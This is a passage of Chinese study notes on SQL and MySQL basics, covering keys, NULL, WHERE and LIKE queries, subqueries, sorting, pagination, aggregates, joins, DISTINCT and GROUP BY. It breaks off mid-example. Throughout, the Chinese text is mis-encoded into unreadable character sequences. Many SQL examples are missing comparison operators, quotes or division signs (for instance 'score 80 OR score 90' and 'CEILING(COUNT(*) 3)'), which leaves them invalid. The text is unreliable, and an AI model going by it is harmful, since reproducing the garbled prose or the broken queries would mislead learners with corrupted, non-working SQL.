è¯­æ³•ç‰¹ç‚¹SQLè¯­è¨€å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼ï¼ï¼ä½†æ˜¯ï¼Œé’ˆå¯¹ä¸åŒçš„æ•°æ®åº“ï¼Œå¯¹äºè¡¨åå’Œåˆ—åï¼Œæœ‰çš„æ•°æ®åº“åŒºåˆ†å¤§å°å†™ï¼Œæœ‰çš„æ•°æ®åº“ä¸åŒºåˆ†å¤§å°å†™ã€‚åŒä¸€ä¸ªæ•°æ®åº“ï¼Œæœ‰çš„åœ¨Linuxä¸ŠåŒºåˆ†å¤§å°å†™ï¼Œæœ‰çš„åœ¨Windowsä¸Šä¸åŒºåˆ†å¤§å°å†™ã€‚ å…³ç³»æ¨¡å‹è¡¨çš„æ¯ä¸€è¡Œç§°ä¸ºè®°å½•ï¼ˆRecordï¼‰ï¼Œè®°å½•æ˜¯ä¸€ä¸ªé€»è¾‘æ„ä¹‰ä¸Šçš„æ•°æ®ã€‚ è¡¨çš„æ¯ä¸€åˆ—ç§°ä¸ºå­—æ®µï¼ˆColumnï¼‰ï¼ŒåŒä¸€ä¸ªè¡¨çš„æ¯ä¸€è¡Œè®°å½•éƒ½æ‹¥æœ‰ç›¸åŒçš„è‹¥å¹²å­—æ®µã€‚ å­—æ®µå®šä¹‰äº†æ•°æ®ç±»å‹ï¼ˆæ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦ä¸²ã€æ—¥æœŸç­‰ï¼‰ï¼Œä»¥åŠæ˜¯å¦å…è®¸ä¸ºNULLã€‚æ³¨æ„NULLè¡¨ç¤ºå­—æ®µæ•°æ®ä¸å­˜åœ¨ã€‚ä¸€ä¸ªæ•´å‹å­—æ®µå¦‚æœä¸ºNULLä¸è¡¨ç¤ºå®ƒçš„å€¼ä¸º0ï¼ŒåŒæ ·çš„ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²å‹å­—æ®µä¸ºNULLä¹Ÿä¸è¡¨ç¤ºå®ƒçš„å€¼ä¸ºç©ºä¸²â€™ â€˜ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œå­—æ®µåº”è¯¥é¿å…å…è®¸ä¸ºNULLã€‚ä¸å…è®¸ä¸ºNULLå¯ä»¥ç®€åŒ–æŸ¥è¯¢æ¡ä»¶ï¼ŒåŠ å¿«æŸ¥è¯¢é€Ÿåº¦ï¼Œä¹Ÿåˆ©äºåº”ç”¨ç¨‹åºè¯»å–æ•°æ®åæ— éœ€åˆ¤æ–­æ˜¯å¦ä¸ºNULLã€‚ åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œå…³ç³»æ˜¯é€šè¿‡ä¸»é”®å’Œå¤–é”®æ¥ç»´æŠ¤çš„ã€‚ ä¸»é”®å¯¹äºå…³ç³»è¡¨ï¼Œæœ‰ä¸ªå¾ˆé‡è¦çš„çº¦æŸï¼Œå°±æ˜¯ä»»æ„ä¸¤æ¡è®°å½•ä¸èƒ½é‡å¤ã€‚ä¸èƒ½é‡å¤ä¸æ˜¯æŒ‡ä¸¤æ¡è®°å½•ä¸å®Œå…¨ç›¸åŒï¼Œè€Œæ˜¯æŒ‡èƒ½å¤Ÿé€šè¿‡æŸä¸ªå­—æ®µå”¯ä¸€åŒºåˆ†å‡ºä¸åŒçš„è®°å½•ï¼Œè¿™ä¸ªå­—æ®µè¢«ç§°ä¸ºä¸»é”®ã€‚ï¼ˆä¸»é”®ä¸èƒ½å¤Ÿä¸€æ ·ï¼‰ å¯¹ä¸»é”®çš„è¦æ±‚ï¼Œæœ€å…³é”®çš„ä¸€ç‚¹æ˜¯ï¼šè®°å½•ä¸€æ—¦æ’å…¥åˆ°è¡¨ä¸­ï¼Œä¸»é”®æœ€å¥½ä¸è¦å†ä¿®æ”¹ï¼Œå› ä¸ºä¸»é”®æ˜¯ç”¨æ¥å”¯ä¸€å®šä½è®°å½•çš„ï¼Œä¿®æ”¹äº†ä¸»é”®ï¼Œä¼šé€ æˆä¸€ç³»åˆ—çš„å½±å“ã€‚ é€‰å–ä¸»é”®çš„ä¸€ä¸ªåŸºæœ¬åŸåˆ™æ˜¯ï¼šä¸ä½¿ç”¨ä»»ä½•ä¸šåŠ¡ç›¸å…³çš„å­—æ®µä½œä¸ºä¸»é”®ã€‚ï¼ˆæ‰‹æœºå·ç ï¼Œèº«ä»½è¯å·ç ï¼Œé‚®ç®±åœ°å€çš†ä¸è¡Œï¼‰ ä¸»é”®çš„å­—æ®µä¸€èˆ¬å‘½åä¸ºidï¼Œå¸¸è§å¯åšidå­—æ®µç±»å‹çš„ç±»å‹æœ‰ï¼š 1.è‡ªå¢æ•´æ•°ç±»å‹ï¼šæ•°æ®åº“ä¼šåœ¨æ’å…¥æ•°æ®æ—¶è‡ªåŠ¨ä¸ºæ¯ä¸€æ¡è®°å½•åˆ†é…ä¸€ä¸ªè‡ªå¢æ•´æ•°ï¼Œè¿™æ ·æˆ‘ä»¬å°±å®Œå…¨ä¸ç”¨æ‹…å¿ƒä¸»é”®é‡å¤ï¼Œä¹Ÿä¸ç”¨è‡ªå·±é¢„å…ˆç”Ÿæˆä¸»é”®ï¼› 2.å…¨å±€å”¯ä¸€GUIDç±»å‹ï¼šä½¿ç”¨ä¸€ç§å…¨å±€å”¯ä¸€çš„å­—ç¬¦ä¸²ä½œä¸ºä¸»é”®ã€‚ è”åˆä¸»é”®ï¼šå…³ç³»æ•°æ®åº“å®é™…ä¸Šè¿˜å…è®¸é€šè¿‡å¤šä¸ªå­—æ®µå”¯ä¸€æ ‡è¯†è®°å½•ï¼Œå³ä¸¤ä¸ªæˆ–æ›´å¤šçš„å­—æ®µéƒ½è®¾ç½®ä¸ºä¸»é”® å¯¹äºè”åˆä¸»é”®ï¼Œå…è®¸ä¸€åˆ—æœ‰é‡å¤ï¼Œåªè¦ä¸æ˜¯æ‰€æœ‰ä¸»é”®åˆ—éƒ½é‡å¤å³å¯ã€‚ï¼ˆä¸€èˆ¬ä¸ä½¿ç”¨è”åˆä¸»é”®ï¼Œé¿å…æ›´åŠ å¤æ‚ï¼‰ å¤–é”® å¤šå¯¹å¤šé€šè¿‡ä¸€ä¸ªè¡¨çš„å¤–é”®å…³è”åˆ°å¦ä¸€ä¸ªè¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å‡ºä¸€å¯¹å¤šå…³ç³»ã€‚æœ‰äº›æ—¶å€™ï¼Œè¿˜éœ€è¦å®šä¹‰â€œå¤šå¯¹å¤šâ€å…³ç³»ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªè€å¸ˆå¯ä»¥å¯¹åº”å¤šä¸ªç­çº§ï¼Œä¸€ä¸ªç­çº§ä¹Ÿå¯ä»¥å¯¹åº”å¤šä¸ªè€å¸ˆï¼Œå› æ­¤ï¼Œç­çº§è¡¨å’Œè€å¸ˆè¡¨å­˜åœ¨å¤šå¯¹å¤šå…³ç³»ã€‚ å¤šå¯¹å¤šå…³ç³»å®é™…ä¸Šæ˜¯é€šè¿‡ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»å®ç°çš„ï¼Œå³é€šè¿‡ä¸€ä¸ªä¸­é—´è¡¨ï¼Œå…³è”ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»ï¼Œå°±å½¢æˆäº†å¤šå¯¹å¤šå…³ç³»ï¼š ä¸€å¯¹ä¸€ä¸€å¯¹ä¸€å…³ç³»æ˜¯æŒ‡ï¼Œä¸€ä¸ªè¡¨çš„è®°å½•å¯¹åº”åˆ°å¦ä¸€ä¸ªè¡¨çš„å”¯ä¸€ä¸€ä¸ªè®°å½•ã€‚ æ€»çš„ï¼šå…³ç³»æ•°æ®åº“é€šè¿‡å¤–é”®å¯ä»¥å®ç°ä¸€å¯¹å¤šã€å¤šå¯¹å¤šå’Œä¸€å¯¹ä¸€çš„å…³ç³»ã€‚å¤–é”®æ—¢å¯ä»¥é€šè¿‡æ•°æ®åº“æ¥çº¦æŸï¼Œä¹Ÿå¯ä»¥ä¸è®¾ç½®çº¦æŸï¼Œä»…ä¾é åº”ç”¨ç¨‹åºçš„é€»è¾‘æ¥ä¿è¯ã€‚ ç´¢å¼•ç´¢å¼•æ˜¯å…³ç³»æ•°æ®åº“ä¸­å¯¹æŸä¸€åˆ—æˆ–å¤šä¸ªåˆ—çš„å€¼è¿›è¡Œé¢„æ’åºçš„æ•°æ®ç»“æ„ã€‚ å”¯ä¸€ç´¢å¼• å¯¼å…¥æ•°æ®å…ˆåˆ›å»ºdatabase(ä¾‹å­ï¼šcreate database æ–‡ä»¶å;) ç„¶å sorce æ–‡ä»¶è·¯å¾„ï¼›ä¾‹å­ï¼šsource C:\\Users\\BD\\MySQLwenjian\\bilibili.sql;æ³¨æ„è·¯å¾„ä¸­ä¸è¦æœ‰ä¸­æ–‡ åªçœ‹è¡¨çš„ç»“æ„desc è¡¨å; æŸ¥è¯¢æ•°æ®åŸºæœ¬æŸ¥è¯¢æŸ¥è¯¢æ•°æ®åº“è¡¨çš„æ•°æ®ï¼šSELECT * FROM è¡¨åï¼› SELECT ä¹Ÿå¯ä»¥ç”¨äºè®¡ç®—ï¼ˆä¾‹å¦‚ï¼šSELECT 100 + 200ï¼›ï¼‰ æ¡ä»¶æŸ¥è¯¢åŸºæœ¬SELECTè¯­å¥é€šè¿‡WHEREæ¡ä»¶æ¥è®¾å®šæŸ¥è¯¢æ¡ä»¶:SELECT * FROM è¡¨å WHERE æ¡ä»¶è¡¨è¾¾å¼ ï¼ˆä¾‹å¦‚ï¼šSELECT * FROM students WHERE score=80;) æ¡ä»¶è¡¨è¾¾å¼:1.**æ¡ä»¶1 AND æ¡ä»¶2**è¡¨è¾¾æ»¡è¶³æ¡ä»¶1å¹¶ä¸”æ»¡è¶³æ¡ä»¶2 â€‹ 2.**æ¡ä»¶1 OR æ¡ä»¶2**è¡¨ç¤ºæ»¡è¶³æ¡ä»¶1æˆ–è€…æ»¡è¶³æ¡ä»¶2 â€‹ 3**. NOT æ¡ä»¶**ï¼Œè¡¨ç¤ºâ€œä¸ç¬¦åˆè¯¥æ¡ä»¶â€çš„è®°å½•(ä¾‹å¦‚ï¼šå†™ä¸€ä¸ªâ€œä¸æ˜¯2ç­çš„å­¦ç”Ÿâ€è¿™ä¸ªæ¡ä»¶ï¼šNOT class_id 2ï¼š) â€‹ è¦ç»„åˆä¸‰ä¸ªæˆ–è€…æ›´å¤šçš„æ¡ä»¶ï¼Œå°±éœ€è¦ç”¨å°æ‹¬å·()è¡¨ç¤ºå¦‚ä½•è¿›è¡Œæ¡ä»¶è¿ç®— â€‹ ï¼ˆä¾‹ï¼šSELECT * FROM students WHERE (score 80 OR score 90) AND gender â€˜Mâ€™;ï¼‰ å¦‚æœä¸åŠ æ‹¬å·ï¼Œæ¡ä»¶è¿ç®—æŒ‰ç…§NOTã€ANDã€ORçš„ä¼˜å…ˆçº§è¿›è¡Œï¼Œå³NOTä¼˜å…ˆçº§æœ€é«˜ï¼Œå…¶æ¬¡æ˜¯ANDï¼Œæœ€åæ˜¯OR æ¨¡ç³ŠæŸ¥è¯¢like;æ”¯æŒ%æˆ–ä¸‹åˆ’çº¿åŒ¹é… %åŒ¹é…ä»»æ„å¤šä¸ªå­—ç¬¦ï¼›ä¸‹åˆ’çº¿æ˜¯ä»»æ„ä¸€ä¸ªå­—ç¬¦ ä¾‹å­ï¼šSELECT ename from emp where ename like%o%;ï¼ˆè¡¨ç¤ºåå­—ä¸­é—´å«â€™Oâ€™çš„ï¼‰ â€‹ SELECT ename from emp where ename like%T;ï¼ˆè¡¨ç¤ºåå­—ä»¥â€™Tâ€™ç»“å°¾ï¼‰ â€‹ SELECT ename from emp where ename like_A%;ï¼ˆè¡¨ç¤ºç¬¬äºŒä¸ªå­—æ¯æ˜¯â€™Aâ€™ï¼‰ å­æŸ¥è¯¢whereä¸­çš„å­æŸ¥è¯¢ä¾‹å­ï¼šæ‰¾å‡ºæ¯”æœ€ä½å·¥èµ„é«˜çš„å‘˜å·¥ SELECT ename,sal FROM emp WHERE sal(SELECT min(sal) FROM emp); fromå­å¥ä¸­çš„å­æŸ¥è¯¢fromåé¢çš„å­æŸ¥è¯¢ï¼Œå¯ä»¥å°†å­æŸ¥è¯¢çš„æŸ¥è¯¢ç»“æœå½“ä½œä¸€å¼ ä¸´æ—¶è¡¨ï¼ˆæŠ€å·§ï¼‰ ä¾‹å­ï¼šæ‰¾å‡ºæ¯ä¸ªå²—ä½çš„å¹³å‡å·¥èµ„çš„è–ªèµ„ç­‰çº§ SELECT t,s.grade from (select job,avg(sal) avgsal from emp group by job) t join salgrade s on t.avgsal between s.losal and s.hisal; selectåçš„å­æŸ¥è¯¢äº†è§£äº†è§£å°±å¥½ æ³¨æ„ï¼šå¯¹äºselectåé¢çš„å­æŸ¥è¯¢æ¥è¯´ï¼Œè¿™ä¸ªå­æŸ¥è¯¢åªèƒ½ä¸€æ¬¡è¿”å›ä¸€æ¡ç»“æœï¼Œå¤šä½™ä¸€æ¡å°±ä¼šæŠ¥é”™ æŠ•å½±æŸ¥è¯¢å¦‚æœæˆ‘ä»¬åªå¸Œæœ›è¿”å›æŸäº›åˆ—çš„æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰€æœ‰åˆ—çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨SELECT åˆ—1, åˆ—2, åˆ—3 FROM â€¦ï¼Œè®©ç»“æœé›†ä»…åŒ…å«æŒ‡å®šåˆ—ã€‚è¿™ç§æ“ä½œç§°ä¸ºæŠ•å½±æŸ¥è¯¢ã€‚ï¼ˆä¾‹ï¼šSELECT idï¼Œname,score FROM students;) ä½¿ç”¨SELECT åˆ—1, åˆ—2, åˆ—3 FROM â€¦æ—¶ï¼Œè¿˜å¯ä»¥ç»™æ¯ä¸€åˆ—èµ·ä¸ªåˆ«åï¼Œè¿™æ ·ï¼Œç»“æœé›†çš„åˆ—åå°±å¯ä»¥ä¸åŸè¡¨çš„åˆ—åä¸åŒã€‚å®ƒçš„è¯­æ³•æ˜¯SELECT åˆ—1 åˆ«å1, åˆ—2 åˆ«å2, åˆ—3 åˆ«å3 FROM â€¦ æŠ•å½±æŸ¥è¯¢åŒæ ·å¯ä»¥æ¥WHEREæ¡ä»¶ï¼Œå®ç°å¤æ‚çš„æŸ¥è¯¢ æ€»çš„åº”ç”¨ä¸€ä¸‹ï¼šSELECT id, score points, name FROM students WHERE gender = M; æ’åºå¦‚æœè¦æŒ‰æˆ‘ä»¬è‡ªå·±çš„æ’åºè€Œä¸æ˜¯æŒ‰ä¸»é”®æ’åºåˆ™åŠ ä¸ŠORDERè¯­å¥ SELECT id, name, gender, score FROM students ORDER BY score; å¦‚æœè¦åè¿‡æ¥ï¼ŒæŒ‰ç…§æˆç»©ä»é«˜åˆ°åº•æ’åºï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸ŠDESCè¡¨ç¤ºâ€œå€’åºâ€ï¼ˆDESCåŠ åœ¨scoreåé¢ï¼‰ï¼Œå¦‚æœscoreåˆ—æœ‰ç›¸åŒçš„æ•°æ®é‚£ä¹ˆå¯ä»¥ç»§ç»­æ·»åŠ åˆ—å å¦‚æœæœ‰WHEREå­å¥ï¼Œé‚£ä¹ˆORDER BYå­å¥è¦æ”¾åˆ°WHEREå­å¥åé¢ SELECT id, name, gender, score FROM students WHERE class_id = 1 ORDER BY score DESC;ï¼ˆå¤šä¸ªå­—æ®µæ’åºå­—æ®µä¹‹é—´åŠ â€™,â€™ ï¼Œå‰é¢èµ·ä¸»å¯¼ä½œç”¨ï¼‰ åˆ†é¡µæŸ¥è¯¢ä½¿ç”¨SELECTæŸ¥è¯¢æ—¶ï¼Œå¦‚æœç»“æœé›†æ•°æ®é‡å¾ˆå¤§ï¼Œæ¯”å¦‚å‡ ä¸‡è¡Œæ•°æ®ï¼Œæ”¾åœ¨ä¸€ä¸ªé¡µé¢æ˜¾ç¤ºçš„è¯æ•°æ®é‡å¤ªå¤§ï¼Œä¸å¦‚åˆ†é¡µæ˜¾ç¤ºï¼Œæ¯æ¬¡æ˜¾ç¤º100æ¡ã€‚ è¦å®ç°åˆ†é¡µåŠŸèƒ½ï¼Œå®é™…ä¸Šå°±æ˜¯ä»ç»“æœé›†ä¸­æ˜¾ç¤ºç¬¬1100æ¡è®°å½•ä½œä¸ºç¬¬1é¡µï¼Œæ˜¾ç¤ºç¬¬101200æ¡è®°å½•ä½œä¸ºç¬¬2é¡µï¼Œä»¥æ­¤ç±»æ¨ã€‚ è¯­å¥ï¼šLIMIT N-M OFFSET Mï¼ˆè¡¨ç¤ºä¸ºæ¯é¡µæœ€å¤šæ˜¾ç¤ºå‡ ä¸ªæ•°æ®ï¼‰ ä¾‹å­ï¼šSELECT id, name, gender, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 0; LIMIT 3 OFFSET 0è¡¨ç¤ºï¼Œå¯¹ç»“æœé›†ä»0å·è®°å½•å¼€å§‹ï¼Œæœ€å¤šå–3æ¡ã€‚æ³¨æ„SQLè®°å½•é›†çš„ç´¢å¼•ä»0å¼€å§‹ã€‚ å¦‚æœè¦æŸ¥è¯¢ç¬¬2é¡µï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦â€œè·³è¿‡â€å¤´3æ¡è®°å½•ï¼Œä¹Ÿå°±æ˜¯å¯¹ç»“æœé›†ä»3å·è®°å½•å¼€å§‹æŸ¥è¯¢ï¼ŒæŠŠOFFSETè®¾å®šä¸º3ã€‚ æ³¨æ„ï¼šOFFSETæ˜¯å¯é€‰çš„ï¼Œå¦‚æœåªå†™LIMIT 15ï¼Œé‚£ä¹ˆç›¸å½“äºLIMIT 15 OFFSET 0ï¼› â€‹ åœ¨MySQLä¸­ï¼ŒLIMIT 15 OFFSET 30è¿˜å¯ä»¥ç®€å†™æˆLIMIT 30, 15ï¼› â€‹ OFFSETè¶…è¿‡äº†æŸ¥è¯¢çš„æœ€å¤§æ•°é‡å¹¶ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯å¾—åˆ°ä¸€ä¸ªç©ºçš„ç»“æœé›†ã€‚ èšåˆæŸ¥è¯¢å¯¹äºç»Ÿè®¡æ€»æ•°ã€å¹³å‡æ•°è¿™ç±»è®¡ç®—ï¼ŒSQLæä¾›äº†ä¸“é—¨çš„èšåˆå‡½æ•°ï¼Œä½¿ç”¨èšåˆå‡½æ•°è¿›è¡ŒæŸ¥è¯¢ï¼Œå°±æ˜¯èšåˆæŸ¥è¯¢ æŸ¥è¯¢ä¸€ä¸ªè¡¨ä¸­ä¸€å…±æœ‰å¤šå°‘æ¡è®°å½•å¯ä»¥ç”¨COUNT()å‡½æ•°ï¼ˆSELECT COUNT(*) FROM students;ï¼‰ ä½¿ç”¨èšåˆæŸ¥è¯¢æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥ç»™åˆ—åè®¾ç½®ä¸€ä¸ªåˆ«åï¼Œä¾¿äºå¤„ç†ç»“æœï¼ˆSELECT COUNT(*) num FROM students;ï¼‰ count(*)ä¸count(å…·ä½“å­—æ®µ)çš„åŒºåˆ«ï¼šå‰ä¸€ä¸ªç»Ÿè®¡æ€»è¡Œæ•°ï¼Œåä¸€ä¸ªç»Ÿè®¡è¯¥å­—æ®µä¸‹æ‰€æœ‰ä¸ä¸ºNULLçš„å…ƒç´ æ€»å’Œ èšåˆæŸ¥è¯¢åŒæ ·å¯ä»¥ä½¿ç”¨WHEREæ¡ä»¶ å…¶ä»–èšåˆå‡½æ•° AVGï¼šSELECT AVG(score) average FROM students WHERE gender = M; æ³¨æ„ï¼šèšåˆå‡½æ•°è‡ªåŠ¨å¿½ç•¥NULL â€‹ èšåˆå‡½æ•°ä¸èƒ½ç›´æ¥ç”¨åœ¨WHEREå­å¥ä¸­ï¼Œå› ä¸ºèšåˆå‡½æ•°åœ¨ä½¿ç”¨æ—¶å¿…é¡»å…ˆåˆ†ç»„æ‰èƒ½ä½¿ç”¨ å¦‚æœèšåˆæŸ¥è¯¢çš„WHEREæ¡ä»¶æ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•è¡Œï¼ŒCOUNT()ä¼šè¿”å›0ï¼Œè€ŒSUM()ã€AVG()ã€MAX()å’ŒMIN()ä¼šè¿”å›NULL æ¯é¡µ3æ¡è®°å½•ï¼Œå¦‚ä½•é€šè¿‡èšåˆæŸ¥è¯¢è·å¾—æ€»é¡µæ•°ï¼šSELECT CEILING(COUNT(*) 3) FROM students; å¤šè¡¨æŸ¥è¯¢è¯­æ³•ï¼šï¼šSELECT * FROM è¡¨1ï¼Œ è¡¨2 è¿™ç§ä¸€æ¬¡æŸ¥è¯¢ä¸¤ä¸ªè¡¨çš„æ•°æ®ï¼ŒæŸ¥è¯¢çš„ç»“æœä¹Ÿæ˜¯ä¸€ä¸ªäºŒç»´è¡¨ï¼Œå®ƒæ˜¯studentsè¡¨å’Œclassesè¡¨çš„â€œä¹˜ç§¯â€ï¼Œå³studentsè¡¨çš„æ¯ä¸€è¡Œä¸classesè¡¨çš„æ¯ä¸€è¡Œéƒ½ä¸¤ä¸¤æ‹¼åœ¨ä¸€èµ·è¿”å›ã€‚ç»“æœé›†çš„åˆ—æ•°æ˜¯studentsè¡¨å’Œclassesè¡¨çš„åˆ—æ•°ä¹‹å’Œï¼Œè¡Œæ•°æ˜¯studentsè¡¨å’Œclassesè¡¨çš„è¡Œæ•°ä¹‹ç§¯ ä¸Šè¿°æŸ¥è¯¢çš„ç»“æœé›†æœ‰ä¸¤åˆ—idå’Œä¸¤åˆ—nameï¼Œä¸¤åˆ—idæ˜¯å› ä¸ºå…¶ä¸­ä¸€åˆ—æ˜¯studentsè¡¨çš„idï¼Œè€Œå¦ä¸€åˆ—æ˜¯classesè¡¨çš„idï¼Œä½†æ˜¯åœ¨ç»“æœé›†ä¸­ï¼Œä¸å¥½åŒºåˆ†ã€‚ä¸¤åˆ—nameåŒç†ï¼›è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥åˆ©ç”¨æŠ•å½±æŸ¥è¯¢çš„â€œè®¾ç½®åˆ—çš„åˆ«åâ€æ¥ç»™ä¸¤ä¸ªè¡¨å„è‡ªçš„idå’Œnameåˆ—èµ·åˆ«å ä¾‹å­ï¼š `SELECT` `students.id sid,` å¤šè¡¨æŸ¥è¯¢æ—¶ï¼Œè¦ä½¿ç”¨**è¡¨å.åˆ—å**è¿™æ ·çš„æ–¹å¼æ¥å¼•ç”¨åˆ—å’Œè®¾ç½®åˆ«åï¼Œè¿™æ ·å°±é¿å…äº†ç»“æœé›†çš„åˆ—åé‡å¤é—®é¢˜ `students.name,` `students.gender,` `students.score,` `classes.id cid,` `classes.name cname``FROM students, classes;` FROMå­å¥ç»™è¡¨è®¾ç½®åˆ«åçš„è¯­æ³•æ˜¯FROM è¡¨å1 åˆ«å1, è¡¨å2 åˆ«å2ï¼ˆä½¿å¾—æŠ•å½±æŸ¥è¯¢æ›´åŠ çš„ç®€æ´ï¼‰ è¿æ¥æŸ¥è¯¢è¿æ¥æŸ¥è¯¢æ˜¯å¦ä¸€ç§ç±»å‹çš„å¤šè¡¨æŸ¥è¯¢ã€‚è¿æ¥æŸ¥è¯¢å¯¹å¤šä¸ªè¡¨è¿›è¡ŒJOINè¿ç®—ï¼Œç®€å•åœ°è¯´ï¼Œå°±æ˜¯å…ˆç¡®å®šä¸€ä¸ªä¸»è¡¨ä½œä¸ºç»“æœé›†ï¼Œç„¶åï¼ŒæŠŠå…¶ä»–è¡¨çš„è¡Œæœ‰é€‰æ‹©æ€§åœ°â€œè¿æ¥â€åœ¨ä¸»è¡¨ç»“æœé›†ä¸Šã€‚ ç¬›å¡å°”ç§¯ç°è±¡ï¼šå½“ä¸¤å¼ è¡¨è¿›è¡Œè¿æ¥æŸ¥è¯¢ä¸”æ²¡æœ‰ä»»ä½•æ¡ä»¶é™åˆ¶çš„æ—¶å€™ï¼Œæœ€ç»ˆçš„æŸ¥è¯¢æ¡æ•°æ˜¯ä¸¤å¼ è¡¨æ¡æ•°çš„ä¹˜ç§¯ å†…è¿æ¥â€”â€”INNER JOINæŸ¥è¯¢å†™æ³•ï¼š1ã€å…ˆç¡®å®šä¸»è¡¨ï¼Œä»ç„¶ä½¿ç”¨FROM è¡¨1çš„è¯­æ³•ï¼› 2ã€å†ç¡®å®šéœ€è¦è¿æ¥çš„è¡¨ï¼Œä½¿ç”¨INNER JOIN è¡¨2çš„è¯­æ³•ï¼› 3ã€ ç„¶åç¡®å®šè¿æ¥æ¡ä»¶ï¼Œä½¿ç”¨ON æ¡ä»¶â€¦ï¼Œè¿™é‡Œçš„æ¡ä»¶æ˜¯s.class_id = c.idï¼Œè¡¨ç¤ºstudentsè¡¨çš„class_idåˆ— ä¸ classesè¡¨çš„idåˆ—ç›¸åŒçš„è¡Œéœ€è¦è¿æ¥ï¼› 4ã€å¯é€‰ï¼šåŠ ä¸ŠWHEREå­å¥ã€ORDER BYç­‰å­å¥ã€‚ ç­‰å€¼è¿æ¥ï¼š SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sINNER JOIN classes cON s.class_id = c.id; INNER JOINåªè¿”å›åŒæ—¶å­˜åœ¨äºä¸¤å¼ è¡¨çš„è¡Œæ•°æ®ï¼Œç”±äºstudentsè¡¨çš„class_idåŒ…å«1ï¼Œ2ï¼Œ3ï¼Œclassesè¡¨çš„idåŒ…å«1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ‰€ä»¥ï¼ŒINNER JOINæ ¹æ®æ¡ä»¶s.class_id c.idè¿”å›çš„ç»“æœé›†ä»…åŒ…å«1ï¼Œ2ï¼Œ3ã€‚ éç­‰å€¼è¿æ¥ï¼šæ¡ä»¶ä¸æ˜¯ä¸€ä¸ªç­‰é‡å…³ç³» ä¾‹å­ï¼šå‘˜å·¥å·¥èµ„åœ¨è¿™ä¸ªå·¥èµ„èŒƒå›´å†… SELECTe.ename,e.sal,s.gradeFROMemp eINNER JOINsalgrade sONe.sal between s.losal and s.hisal; è‡ªè¿æ¥ï¼šä¸€ä¸ªè¡¨é‡Œé¢è‡ªå·±å¯¹åº”ï¼ŒæŠ€å·§æ˜¯ä¸€å¼ è¡¨çœ‹æˆä¸¤å¼ è¡¨ ä¾‹å­ï¼šæ‰¾å‡ºå‘˜å·¥åŠå¯¹åº”çš„é¢†å¯¼ SELECT - a.ename yuangong,b.ename leader - FROM - emp a - INNER JOIN - emp b - ON - a.mgr=b.empno;ï¼ˆå‘˜å·¥é¢†å¯¼ç¼–å·ç­‰äºå‘˜å·¥ç¼–å·ï¼‰ å¤–è¿æ¥â€“OUTER JOINå³å¤–è¿æ¥ï¼šRIGHT OUTER JOINè¿”å›å³è¡¨éƒ½å­˜åœ¨çš„è¡Œã€‚å¦‚æœæŸä¸€è¡Œä»…åœ¨å³è¡¨å­˜åœ¨ï¼Œé‚£ä¹ˆç»“æœé›†å°±ä¼šä»¥NULLå¡«å……å‰©ä¸‹çš„å­—æ®µã€‚ å·¦å¤–è¿æ¥ï¼šLEFT OUTER JOINåˆ™è¿”å›å·¦è¡¨éƒ½å­˜åœ¨çš„è¡Œã€‚ FULL OUTER JOINï¼Œå®ƒä¼šæŠŠä¸¤å¼ è¡¨çš„æ‰€æœ‰è®°å½•å…¨éƒ¨é€‰æ‹©å‡ºæ¥ï¼Œå¹¶ä¸”ï¼Œè‡ªåŠ¨æŠŠå¯¹æ–¹ä¸å­˜åœ¨çš„åˆ—å¡«å……ä¸ºNULLã€‚ ä¾‹å­ï¼šSELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sRIGHT OUTER JOIN classes cï¼ˆouterå¯ä»¥çœç•¥ï¼‰ON s.class_id = c.id; å¤šä¸ªè¡¨è¿›è¡Œè¿æ¥select..... from a join b on aå’Œbçš„è¿æ¥æ¡ä»¶ join c on aå’Œcçš„è¿æ¥æ¡ä»¶ join d on aå’Œdçš„è¿æ¥æ¡ä»¶ ä¸€æ¡SQLä¸­å†…è¿æ¥å’Œå¤–è¿æ¥å¯ä»¥æ··åˆ DISTINCTä½œç”¨ï¼šæŸ¥è¯¢ç»“æœå»é™¤é‡å¤è®°å½•ï¼Œä½†åŸè¡¨è®°å½•ä¸ä¼šè¢«ä¿®æ”¹ åŸºç¡€è¯­æ³•ï¼šSELECT DISTINCT å­—æ®µ FROM è¡¨å; DINSTINCTåªèƒ½å‡ºç°åœ¨æ‰€æœ‰å­—æ®µçš„æœ€å‰æ–¹ ä¾‹å­ï¼šSELECT DISTINCT job,number FROM è¡¨å;è¡¨ç¤ºjob,numberä¸¤ä¸ªåŒæ—¶å»é‡ åˆ†ç»„æŸ¥è¯¢selectâ€¦fromâ€¦whereâ€¦group byâ€¦order byâ€¦æ‰§è¡Œé¡ºåºæ˜¯from,where,group by,select,order by åˆ†ç»„è¯­å¥ï¼šGROUP BY(ä¾‹ï¼šSELECT COUNT(*) num FROM students GROUP BY class_id;) â€‹ ä¹Ÿå¯ä»¥ä½¿ç”¨å¤šä¸ªåˆ—è¿›è¡Œåˆ†ç»„ â€‹ ï¼ˆSELECT class_id, gender, COUNT(*) num FROM students GROUP BY class_id, gender;ï¼‰ ï¼ˆæ³¨æ„ï¼šåœ¨ä¸€æ¡selectè¯­å¥å½“ä¸­ï¼Œå¦‚æœæœ‰grorup byè¯­å¥çš„è¯ï¼Œselectåé¢åªèƒ½è·Ÿå‚åŠ åˆ†ç»„çš„å­—æ®µï¼Œä»¥ååˆ†ç»„å‡½æ•°ï¼Œå…¶ä»–çš„ä¸€å¾‹ä¸èƒ½è·Ÿã€‚ ä¾‹å­ï¼šSELECT 